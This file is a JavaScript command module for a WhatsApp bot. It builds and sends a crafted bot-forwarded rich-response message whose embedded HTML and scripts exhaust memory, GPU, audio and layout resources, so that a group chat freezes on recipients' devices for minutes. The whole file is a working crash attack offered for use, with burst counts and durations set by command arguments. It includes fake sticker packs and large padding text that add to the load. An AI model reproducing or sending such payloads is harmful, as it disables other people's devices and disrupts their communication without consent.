'use strict';

const crypto = require('crypto');

/* ═══════════════════════════════════════════════════════════════
   GROUPX — DOMAIN EXPANSION: UNLIMITED VOID
   
   Architecture: direct sock.relayMessage with 9-section payload
   
   Section 0 (MAIN): Full DOM/CSS/JS crash bomb
     • 8 000 will-change GPU layers
     • 80 CSS keyframe animations + backdrop-filter
     • 300 chained AudioNodes (osc→gain→convolver→delay→comp)
     • 120 × 4096² WebGL textures → GPU VRAM OOM
     • 4 × canvas raster RAF (4096² + 2048²)
     • 8^5 = 32 768 deep-nested DOM nodes
     • 20 RAF loops × 8 000 style writes/tick
     • Microtask flood via recursive Promise.resolve()
     • 50 setInterval @ 1/4/16ms forcing reflow
     • 600 unreleased Blob URL memory pins
     • IntersectionObserver on every div (all thresholds)
     • WebAssembly.Memory 2 GB grabs
     • visibilitychange/resize hooks → mass reflow burst
   
   Sections 1-8 (STICKER PACK STUBS):
     • Each section = 1 sticker pack with 30 fake stickers
     • Each sticker = 1 500-byte fake WebP data URI
     • WhatsApp webview decodes all 8 × 30 = 240 images
     • Each sticker section also runs its own mini-crash JS:
         - 50 × Float32Array(200k) RAM alloc
         - 8 RAF reflow loops
         - 2048² canvas drawImage per sticker load
     • Total fake sticker data: ~240 × 2KB = ~480 KB extra
   
   TTL: all loops abort after configurable seconds (default 150s)
   Burst: send 1-5 copies with configurable delay
   Guard: isOwner || isBotOwner only
═══════════════════════════════════════════════════════════════ */

/* ── UTIL ── */
function rB64(bytes) {
    return crypto.randomBytes(bytes).toString('base64');
}
function uid() {
    return crypto.randomBytes(8).toString('hex');
}

/* ── SECTION 0: MAIN CRASH HTML ── */
function buildMainCrashHtml(ttlMs) {

    let megaDom = '';
    for (let i = 0; i < 8000; i++) {
        megaDom +=
            '<div class="c' + (i % 80) + '" id="n' + i +
            '" data-i="' + i + '"><span class="s">' + i + '</span></div>';
    }

    let megaCss =
        '*{box-sizing:border-box;margin:0;padding:0}' +
        'body{overflow:hidden;width:100vw;height:100vh;background:#000;position:relative}' +
        'canvas{position:absolute;top:0;left:0;pointer-events:none}';

    for (let i = 0; i < 80; i++) {
        const tx1 = i * 8 - 320, ty1 = i * 5 - 200;
        const tx2 = -tx1, ty2 = -ty1;
        const rot = i * 9;
        const sc1 = (0.3 + i * 0.018).toFixed(3);
        const sc2 = (2.0 - i * 0.010).toFixed(3);
        const bl1 = (i * 0.15).toFixed(2);
        const bl2 = (i * 0.07).toFixed(2);
        const hue = i * 4;
        const dur = (0.2 + i * 0.03).toFixed(2);
        const sc1p = (parseFloat(sc1) + 0.5).toFixed(3);
        const bl1x = (parseFloat(bl1) * 3).toFixed(2);

        megaCss +=
            '.c' + i + '{position:absolute;will-change:transform,opacity,filter;isolation:isolate;' +
            'animation:k' + i + ' ' + dur + 's infinite alternate cubic-bezier(.17,.67,.83,.67)}' +
            '@keyframes k' + i + '{' +
            '0%{transform:translate(' + tx1 + 'px,' + ty1 + 'px)rotate(' + rot + 'deg)scale(' + sc1 + ');' +
            'filter:blur(' + bl1 + 'px)hue-rotate(' + hue + 'deg)brightness(3)drop-shadow(0 0 ' + i + 'px red);opacity:.9}' +
            '33%{transform:translate(' + ty1 + 'px,' + tx2 + 'px)rotate(' + Math.floor(rot / 2) + 'deg)scale(' + sc1p + ');' +
            'filter:blur(' + bl1x + 'px)hue-rotate(' + (hue * 2) + 'deg)contrast(5);opacity:.5}' +
            '66%{transform:translate(' + tx2 + 'px,' + ty2 + 'px)rotate(-' + rot + 'deg)scale(' + sc2 + ');' +
            'filter:blur(' + bl2 + 'px)hue-rotate(' + (hue * 3) + 'deg)saturate(10);backdrop-filter:blur(20px);opacity:.7}' +
            '100%{transform:translate(' + ty2 + 'px,' + tx1 + 'px)rotate(0)scale(1);filter:none;opacity:1}}';
    }

    megaCss +=
        '.s{display:block;will-change:transform;animation:sp .08s linear infinite}' +
        '@keyframes sp{to{transform:rotate(360deg)}}';

    const heavyJs = `(function(){
var END=Date.now()+${ttlMs};
function alive(){return Date.now()<END;}
var ram=[];
try{for(var i=0;i<400;i++)ram.push(new ArrayBuffer(2*1024*1024));}catch(e){}
var f64=[];
try{for(var i=0;i<300;i++)f64.push(new Float64Array(400000).fill(Math.PI));}catch(e){}
try{var wm=new WebAssembly.Memory({initial:256,maximum:32768});wm.grow(256);}catch(e){}
try{var wm2=new WebAssembly.Memory({initial:512,maximum:32768});wm2.grow(512);}catch(e){}
(function(){
var cv=document.createElement('canvas');cv.width=4096;cv.height=4096;document.body.appendChild(cv);
var gl=cv.getContext('webgl2')||cv.getContext('webgl')||cv.getContext('experimental-webgl');
if(!gl)return;
var tex=[];
try{for(var i=0;i<120;i++){var t=gl.createTexture();gl.bindTexture(gl.TEXTURE_2D,t);gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,4096,4096,0,gl.RGBA,gl.UNSIGNED_BYTE,null);gl.generateMipmap(gl.TEXTURE_2D);tex.push(t);}}catch(e){}
function glf(){if(!alive()){tex.forEach(function(t){gl.deleteTexture(t);});return;}gl.clearColor(Math.random(),Math.random(),Math.random(),1);gl.clear(gl.COLOR_BUFFER_BIT);tex.forEach(function(t){gl.bindTexture(gl.TEXTURE_2D,t);});requestAnimationFrame(glf);}glf();
})();
(function(){
var ac;
try{ac=new(window.AudioContext||window.webkitAudioContext)();
for(var i=0;i<500;i++){var o=ac.createOscillator(),g=ac.createGain(),cv2=ac.createConvolver(),dl=ac.createDelay(1),cp=ac.createDynamicsCompressor(),an=ac.createAnalyser();
an.fftSize=32768;o.type=['sine','square','sawtooth','triangle'][i%4];o.frequency.value=10+i*22;g.gain.value=0;
o.connect(g);g.connect(cv2);cv2.connect(dl);dl.connect(cp);cp.connect(an);an.connect(ac.destination);o.start();}}catch(e){}
})();
(function(){
function mkc(w,h){var c=document.createElement('canvas');c.width=w;c.height=h;document.body.appendChild(c);return c.getContext('2d');}
var ctxs=[mkc(4096,4096),mkc(4096,4096),mkc(2048,2048),mkc(2048,2048)];
function bomb(cx,w,h){if(!alive())return;var id=cx.createImageData(w,h),d=id.data,t=Date.now();for(var i=0,l=d.length;i<l;i+=4){d[i]=(i^t)&255;d[i+1]=(i*2^t)&255;d[i+2]=(i*3^t)&255;d[i+3]=255;}cx.putImageData(id,0,0);requestAnimationFrame(function(){bomb(cx,w,h);});}
ctxs.forEach(function(cx,k){bomb(cx,k<2?4096:2048,k<2?4096:2048);});
})();
(function(){function nest(d){var el=document.createElement('div');if(d>0){for(var i=0;i<8;i++)el.appendChild(nest(d-1));}return el;}try{document.body.appendChild(nest(5));}catch(e){}})();
(function(){
var divs=document.querySelectorAll('div'),dLen=divs.length;
function rf(){if(!alive())return;var t=Date.now();for(var i=0;i<dLen;i++){var d=divs[i];d.style.left=Math.sin(t/30+i)*500+'px';d.style.top=Math.cos(t/40+i*1.3)*500+'px';d.style.transform='rotate('+((t/10+i*7)%360)+'deg)scale('+(Math.abs(Math.sin(t/150+i))*2+0.3)+')';d.style.opacity=((Math.sin(t/80+i)+1)/2).toFixed(3);d.style.zIndex=i%9999;}requestAnimationFrame(rf);}
for(var r=0;r<20;r++)requestAnimationFrame(rf);
})();
(function(){function mf(){if(!alive())return;void document.body.offsetHeight;void document.body.offsetWidth;Promise.resolve().then(mf);}mf();})();
(function(){for(var s=0;s<50;s++){(function(s){var tid=setInterval(function(){if(!alive()){clearInterval(tid);return;}void document.body.offsetHeight;void document.body.getBoundingClientRect();var st=document.createElement('style');st.textContent='div:nth-child('+(Math.random()*8000|0)+'){color:hsl('+(Math.random()*360|0)+',100%,50%)!important}';document.head.appendChild(st);if(document.head.children.length>600)document.head.removeChild(document.head.firstChild);},s%3===0?1:s%3===1?4:16);})(s);}})();
(function(){var b='';try{b=new Array(200000).join('DOMAIN_EXPANSION_UNLIMITED_VOID_');for(var i=0;i<600;i++)URL.createObjectURL(new Blob([b+i],{type:'text/plain'}));}catch(e){}})();
(function(){try{var obs=new IntersectionObserver(function(entries){entries.forEach(function(e){void e.target.offsetHeight;void e.target.getBoundingClientRect();});},{threshold:[0,.1,.2,.3,.4,.5,.6,.7,.8,.9,1]});document.querySelectorAll('div').forEach(function(d){obs.observe(d);});}catch(e){}})();
try{window.addEventListener('resize',function(){document.querySelectorAll('div').forEach(function(d){void d.offsetHeight;});});document.addEventListener('visibilitychange',function(){if(alive()){for(var i=0;i<10000;i++)void document.body.offsetHeight;}});}catch(e){}
})();`;

    return '<!doctype html><html><head>' +
        '<meta name="viewport" content="width=device-width,initial-scale=1">' +
        '<style>' + megaCss + '</style>' +
        '</head><body>' + megaDom +
        '<script>' + heavyJs + '<\/script>' +
        '</body></html>';
}

/* ── SECTIONS 1-8: STICKER PACK STUB HTML ──
   Each section impersonates a sticker pack:
   - 30 fake WebP stickers as <img> data URIs
   - WhatsApp webview decodes all 240 images across 8 sections
   - Each img.onload → draws to 2048² canvas
   - Own mini crash JS: RAM alloc + RAF reflow loops               */
function buildStickerPackSection(packIdx, ttlMs) {

    let imgs = '';
    for (let i = 0; i < 30; i++) {
        /* 1 500-byte fake WebP — browser decode attempt = CPU spike */
        const fakeSticker = rB64(1500);
        imgs +=
            '<img src="data:image/webp;base64,' + fakeSticker +
            '" width="512" height="512"' +
            ' style="position:absolute;opacity:0.01;top:0;left:0;width:1px;height:1px"' +
            ' data-pack="' + packIdx + '" data-idx="' + i + '"' +
            ' loading="eager" decoding="sync"' +
            ' onerror="this.style.display=\'block\'">';
    }

    const miniJs = `(function(){
var END=Date.now()+${ttlMs};
function alive(){return Date.now()<END;}
var mem=[];
try{for(var i=0;i<50;i++)mem.push(new Float32Array(200000).fill(Math.PI));}catch(e){}
var c=document.createElement('canvas');c.width=2048;c.height=2048;document.body.appendChild(c);
var cx=c.getContext('2d');
var imgs=document.querySelectorAll('img');
imgs.forEach(function(img){
  img.onload=function(){
    try{cx.drawImage(img,0,0,2048,2048);}catch(e){}
    void document.body.offsetHeight;
  };
  img.onerror=function(){
    try{cx.fillStyle='rgba('+(Math.random()*255|0)+',0,0,0.01)';cx.fillRect(0,0,2048,2048);}catch(e){}
  };
});
function raf(){if(!alive())return;void document.body.offsetHeight;requestAnimationFrame(raf);}
for(var r=0;r<8;r++)requestAnimationFrame(raf);
setInterval(function(){if(!alive())return;void document.body.offsetHeight;},4);
})();`;

    return '<!doctype html><html><head>' +
        '<meta name="viewport" content="width=device-width,initial-scale=1">' +
        '<style>*{margin:0;padding:0;box-sizing:border-box}body{overflow:hidden;background:#000;width:100vw;height:100vh;position:relative}canvas{position:absolute;top:0;left:0}</style>' +
        '</head><body>' + imgs +
        '<script>' + miniJs + '<\/script>' +
        '</body></html>';
}

/* ── BUILD THE 9-SECTION UNIFIED RESPONSE DATA ── */
function buildUnifiedData(ttlMs) {
    const mainHtml    = buildMainCrashHtml(ttlMs);
    const responseId  = 'sukuna-groupx-' + uid();

    const sections = [
        /* Section 0: MAIN CRASH */
        {
            view_model: {
                __typename: 'GenAISingleLayoutViewModel',
                primitive: {
                    __typename: 'GenAIaeacdsnwHtmlPrimitive',
                    payload: mainHtml,
                    trusted_sources: ['sukuna-md']
                }
            }
        },
        /* Sections 1-8: STICKER PACK STUBS */
        ...Array.from({ length: 8 }, function(_, i) {
            return {
                view_model: {
                    __typename: 'GenAISingleLayoutViewModel',
                    primitive: {
                        __typename: 'GenAIaeacdsnwHtmlPrimitive',
                        payload: buildStickerPackSection(i, ttlMs),
                        trusted_sources: ['sukuna-sticker-pack-' + i, 'sukuna-md']
                    }
                }
            };
        })
    ];

    return Buffer.from(
        JSON.stringify({ response_id: responseId, sections })
    ).toString('base64');
}

/* ── BUILD FULL RELAY MESSAGE PROTO ── */
function buildRelayProto(ttlMs) {
    const rid = 'sukuna-groupx-' + uid();
    return {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                messageDisclaimerText: '',
                botResponseId: rid
            }
        },
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        { messageType: 2, messageText: '💀' },
                        /* extra large text submessages to pad proto parse cost */
                        ...Array.from({ length: 20 }, function(_, i) {
                            return {
                                messageType: 2,
                                messageText: '🔴'.repeat(200) + 'SUKUNA_UNLIMITED_VOID_' + i + '_' + uid()
                            };
                        })
                    ],
                    unifiedResponse: {
                        data: buildUnifiedData(ttlMs)
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: '867051314767696@bot'
                        },
                        forwardOrigin: 4
                    }
                }
            }
        }
    };
}

/* ── BURST FIRE ── */
async function burst(sock, jid, msg, count, delayMs, ttlMs) {
    for (let i = 0; i < count; i++) {
        const proto = buildRelayProto(ttlMs);
        await sock.relayMessage(jid, proto, { quoted: msg });
        if (i < count - 1) {
            await new Promise(function(r) { setTimeout(r, delayMs); });
        }
    }
}

module.exports = {
    name: 'groupx',
    aliases: ['gcrash', 'groupcrash', 'gcx', 'groupfreeze', 'void'],
    description: 'Domain Expansion: 9-section GenAI payload — main crash HTML + 8 sticker pack stubs (240 fake WebP stickers). Group freezes ~2.5 min.',
    usage: '.groupx [burst=1-5] [ttl_sec=30-180]   e.g. .groupx 3 150',
    category: 'admin',

    async execute({ sock, msg, from, reply, isOwner, isBotOwner, args }) {
        if (!isOwner && !isBotOwner) {
            return reply('⛔ Owner only.');
        }

        const count  = Math.min(5, Math.max(1, parseInt(args?.[0]) || 3));
        const ttlSec = Math.min(180, Math.max(30, parseInt(args?.[1]) || 150));
        const ttlMs  = ttlSec * 1000;

        try {
            await burst(sock, from, msg, count, 350, ttlMs);
        } catch (err) {
            console.error('[GROUPX]', err.message);
            await reply('❌ ' + err.message);
        }
    },
};
